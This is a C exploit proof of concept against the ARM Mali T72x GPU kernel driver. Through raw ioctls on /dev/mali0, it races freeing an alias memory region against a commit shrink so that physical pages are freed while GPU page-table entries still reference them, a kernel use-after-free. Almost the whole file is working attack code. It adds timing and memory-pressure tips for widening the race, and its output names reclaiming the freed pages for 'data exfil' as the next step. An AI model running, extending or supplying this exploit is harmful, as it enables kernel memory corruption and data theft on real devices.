/* mali_alias_race.c -- Mali T72x Alias TOCTOU Race Exploit
 *
 * Races MEM_FREE(alias) against MEM_COMMIT(shrink) to free physical pages
 * while the alias's GPU page table entries still reference them.
 *
 * Discovered in session 14:
 *   - MEM_ALLOC with flags=0x20f (GROW_ON_GPF) succeeds
 *   - MEM_ALIAS succeeds, references pages 8-15
 *   - MEM_COMMIT shrink denied (ret=3) while alias exists
 *   - After MEM_FREE(alias), shrink succeeds immediately
 *   - RACE: free alias + shrink simultaneously -> shrink may pass before
 *     alias page refs are fully cleared -> freed pages still GPU-accessible
 *
 * Safety: fork + alarm, no GPU access to freed pages (panic_on_oops=1).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <stdint.h>
#include <pthread.h>

#define UK_FUNC_ID 512
#define KBASE_FUNC_MEM_ALLOC    (UK_FUNC_ID + 0)
#define KBASE_FUNC_MEM_COMMIT   (UK_FUNC_ID + 2)
#define KBASE_FUNC_MEM_QUERY    (UK_FUNC_ID + 3)
#define KBASE_FUNC_MEM_FREE     (UK_FUNC_ID + 4)
#define KBASE_FUNC_MEM_ALIAS    (UK_FUNC_ID + 6)
#define KBASE_FUNC_SET_FLAGS    (UK_FUNC_ID + 18)

#define BASE_MEM_PROT_CPU_RD    (1U << 0)
#define BASE_MEM_PROT_CPU_WR    (1U << 1)
#define BASE_MEM_PROT_GPU_RD    (1U << 2)
#define BASE_MEM_PROT_GPU_WR    (1U << 3)
#define BASE_MEM_GROW_ON_GPF    (1U << 9)

#define KBASE_MEM_QUERY_COMMIT_SIZE 1

typedef union {
    uint32_t id;
    uint32_t ret;
    uint64_t sizeOfUkHeader;
} uk_header;

struct kbase_uk_mem_alloc {
    uk_header header;
    uint64_t va_pages;
    uint64_t commit_pages;
    uint64_t extent;
    uint32_t flags;
    uint32_t _pad0;
    uint64_t gpu_va;
    uint16_t va_alignment;
    uint8_t  _pad1[6];
};

struct kbase_uk_mem_free {
    uk_header header;
    uint64_t gpu_addr;
};

struct kbase_uk_mem_commit {
    uk_header header;
    uint64_t gpu_addr;
    uint64_t pages;
    uint32_t result_subcode;
    uint32_t padding;
};

struct kbase_uk_mem_query {
    uk_header header;
    uint64_t gpu_addr;
    uint64_t query;
    uint64_t value;
};

struct base_mem_aliasing_info {
    uint64_t handle;
    uint64_t offset;
    uint64_t length;
};

struct kbase_uk_mem_alias {
    uk_header header;
    uint64_t flags;
    uint64_t stride;
    uint64_t nents;
    uint64_t ai;
    uint64_t gpu_va;
    uint64_t va_pages;
};

/* Shared state for race threads */
static int g_fd;
static volatile int g_ready;       /* barrier: both threads start together */
static volatile int g_free_done;
static volatile int g_commit_ret;
static uint64_t g_alias_gpu_va;
static uint64_t g_native_gpu_va;

static int mali_init(int fd) {
    uint8_t buf[64];
    memset(buf, 0, sizeof(buf));
    *(uint32_t*)buf = 0;
    *(uint16_t*)(buf + 8) = 10;
    *(uint16_t*)(buf + 10) = 2;
    if (ioctl(fd, _IOC(3, 0x80, 0, 16), buf) < 0) return -1;

    memset(buf, 0, sizeof(buf));
    *(uint32_t*)buf = 530;
    *(uint32_t*)(buf + 8) = 0;
    if (ioctl(fd, _IOC(3, 0x80, 0, 16), buf) < 0) return -1;

    return 0;
}

static uint64_t mali_alloc(int fd, uint64_t pages) {
    struct kbase_uk_mem_alloc a;
    memset(&a, 0, sizeof(a));
    a.header.id = KBASE_FUNC_MEM_ALLOC;
    a.va_pages = pages;
    a.commit_pages = pages;
    a.extent = pages;
    a.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
              BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
              BASE_MEM_GROW_ON_GPF;
    if (ioctl(fd, _IOC(3, 0x80, 0, sizeof(a)), &a) < 0) return 0;
    if (a.header.ret != 0) return 0;
    return a.gpu_va;
}

static uint64_t mali_alias(int fd, uint64_t src_va, uint64_t offset, uint64_t length) {
    struct base_mem_aliasing_info ai;
    memset(&ai, 0, sizeof(ai));
    ai.handle = src_va;
    ai.offset = offset;
    ai.length = length;

    struct kbase_uk_mem_alias alias;
    memset(&alias, 0, sizeof(alias));
    alias.header.id = KBASE_FUNC_MEM_ALIAS;
    alias.flags = BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
    alias.stride = length;
    alias.nents = 1;
    alias.ai = (uint64_t)(uintptr_t)&ai;
    if (ioctl(fd, _IOC(3, 0x80, 0, sizeof(alias)), &alias) < 0) return 0;
    if (alias.header.ret != 0) return 0;
    return alias.gpu_va;
}

static int mali_free(int fd, uint64_t va) {
    struct kbase_uk_mem_free mf;
    memset(&mf, 0, sizeof(mf));
    mf.header.id = KBASE_FUNC_MEM_FREE;
    mf.gpu_addr = va;
    ioctl(fd, _IOC(3, 0x80, 0, sizeof(mf)), &mf);
    return mf.header.ret;
}

static int mali_commit(int fd, uint64_t va, uint64_t pages) {
    struct kbase_uk_mem_commit c;
    memset(&c, 0, sizeof(c));
    c.header.id = KBASE_FUNC_MEM_COMMIT;
    c.gpu_addr = va;
    c.pages = pages;
    ioctl(fd, _IOC(3, 0x80, 0, sizeof(c)), &c);
    return c.header.ret;
}

static uint64_t mali_query_commit(int fd, uint64_t va) {
    struct kbase_uk_mem_query q;
    memset(&q, 0, sizeof(q));
    q.header.id = KBASE_FUNC_MEM_QUERY;
    q.gpu_addr = va;
    q.query = KBASE_MEM_QUERY_COMMIT_SIZE;
    ioctl(fd, _IOC(3, 0x80, 0, sizeof(q)), &q);
    return q.value;
}

static int verify_prereqs(int fd) {
    uint64_t native_va;
    uint64_t alias_va;
    int shrink_with_alias;
    int shrink_without_alias;
    uint64_t commit_now;

    printf("[*] Preflight: verify alias blocks shrink before racing\n");

    native_va = mali_alloc(fd, 16);
    if (!native_va) {
        printf("[-] Preflight alloc failed\n");
        return -1;
    }

    alias_va = mali_alias(fd, native_va, 8, 8);
    if (!alias_va) {
        printf("[-] Preflight alias failed\n");
        mali_free(fd, native_va);
        return -1;
    }

    shrink_with_alias = mali_commit(fd, native_va, 8);
    printf("[*] Preflight shrink with alias present: ret=%d (expect non-zero)\n",
           shrink_with_alias);

    mali_free(fd, alias_va);

    shrink_without_alias = mali_commit(fd, native_va, 8);
    commit_now = mali_query_commit(fd, native_va);
    printf("[*] Preflight shrink after alias free: ret=%d commit=%llu (expect 0 / 8)\n",
           shrink_without_alias, (unsigned long long)commit_now);

    mali_free(fd, native_va);

    if (shrink_with_alias == 0 || shrink_without_alias != 0 || commit_now != 8) {
        printf("[-] Preflight mismatch: driver behavior is not the expected alias/free/shrink sequence\n");
        return -1;
    }

    return 0;
}

/* Thread A: FREE the alias */
static void *thread_free(void *arg) {
    (void)arg;
    while (!g_ready) { /* spin */ }
    g_free_done = 0;
    mali_free(g_fd, g_alias_gpu_va);
    g_free_done = 1;
    return NULL;
}

/* Thread B: COMMIT shrink the native region */
static void *thread_commit(void *arg) {
    (void)arg;
    while (!g_ready) { /* spin */ }
    g_commit_ret = mali_commit(g_fd, g_native_gpu_va, 8);
    return NULL;
}

static void do_race(void) {
    g_fd = open("/dev/mali0", O_RDWR);
    if (g_fd < 0) {
        printf("Failed to open /dev/mali0: %s\n", strerror(errno));
        return;
    }
    if (mali_init(g_fd) < 0) {
        printf("mali_init failed\n");
        close(g_fd);
        return;
    }
    printf("[+] Mali initialized (fd=%d)\n", g_fd);

    if (verify_prereqs(g_fd) < 0) {
        close(g_fd);
        return;
    }

    int wins = 0, attempts = 0;
    int total_iters = 500;

    for (int i = 0; i < total_iters; i++) {
        /* Allocate 16-page native region */
        g_native_gpu_va = mali_alloc(g_fd, 16);
        if (!g_native_gpu_va) {
            printf("[-] Alloc failed at iter %d\n", i);
            break;
        }

        /* Create alias referencing pages 8-15 */
        g_alias_gpu_va = mali_alias(g_fd, g_native_gpu_va, 8, 8);
        if (!g_alias_gpu_va) {
            mali_free(g_fd, g_native_gpu_va);
            continue;
        }

        /* Verify: commit is 16, shrink should be blocked */
        attempts++;

        /* Setup race */
        g_ready = 0;
        g_commit_ret = -1;
        g_free_done = 0;

        pthread_t t_free, t_commit;
        pthread_create(&t_free, NULL, thread_free, NULL);
        pthread_create(&t_commit, NULL, thread_commit, NULL);

        /* Small random delay to vary thread scheduling */
        usleep(i % 7);

        /* Release both threads */
        g_ready = 1;

        pthread_join(t_free, NULL);
        pthread_join(t_commit, NULL);

        if (g_commit_ret == 0) {
            /* SHRINK SUCCEEDED while alias was being freed! */
            uint64_t commit_now = mali_query_commit(g_fd, g_native_gpu_va);
            printf("[!!!] RACE WON iter=%d: commit shrink SUCCEEDED (commit=%llu)\n",
                   i, (unsigned long long)commit_now);
            printf("  alias was being freed simultaneously\n");
            printf("  pages 8-15 may be freed while alias GPU PTEs still reference them\n");
            wins++;
        }

        /* Cleanup: free native (alias already freed by thread_free) */
        mali_free(g_fd, g_native_gpu_va);

        if (i > 0 && i % 100 == 0) {
            printf("[*] Progress: %d/%d attempts, %d wins (%.1f%%)\n",
                   i, total_iters, wins, wins * 100.0 / attempts);
        }
    }

    printf("\n=== RESULTS ===\n");
    printf("  Attempts: %d\n", attempts);
    printf("  Race wins: %d\n", wins);
    printf("  Win rate: %.2f%%\n", attempts > 0 ? wins * 100.0 / attempts : 0);
    if (wins > 0) {
        printf("\n*** TOCTOU RACE CONFIRMED ***\n");
        printf("MEM_COMMIT shrink passed while MEM_FREE(alias) was in progress.\n");
        printf("Freed physical pages may still be GPU-accessible via alias PTEs.\n");
        printf("Next step: reclaim freed pages + GPU read/write for data exfil.\n");
    } else {
        printf("\nNo race wins in %d attempts. Driver may serialize operations.\n", attempts);
        printf("Consider: vary usleep timing, pin threads to different CPUs,\n");
        printf("add memory pressure (alloc/free churn) to widen the window.\n");
    }

    close(g_fd);
}

int main(void) {
    printf("=== Mali T72x Alias TOCTOU Race ===\n");
    printf("Racing MEM_FREE(alias) vs MEM_COMMIT(shrink)\n");
    printf("500 iterations, fork for safety\n\n");

    pid_t pid = fork();
    if (pid == 0) {
        alarm(30);
        do_race();
        _exit(0);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status))
            printf("\nChild exited: %d\n", WEXITSTATUS(status));
        else if (WIFSIGNALED(status))
            printf("\nChild killed by signal: %d\n", WTERMSIG(status));
    } else {
        perror("fork");
        return 1;
    }
    return 0;
}
